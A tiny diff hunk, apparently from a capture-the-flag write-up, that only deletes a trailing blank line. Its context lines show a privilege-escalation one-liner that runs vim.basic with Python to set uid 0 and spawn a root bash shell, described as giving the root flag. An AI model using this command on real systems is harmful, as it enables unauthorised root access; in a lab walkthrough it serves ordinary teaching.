@@ -59,4 +59,3 @@ vim.basic -c ':py3 import os; os.setuid(0); os.system("/bin/bash")'
 This gives the root shell and thus the root flag.
 
 ---
-
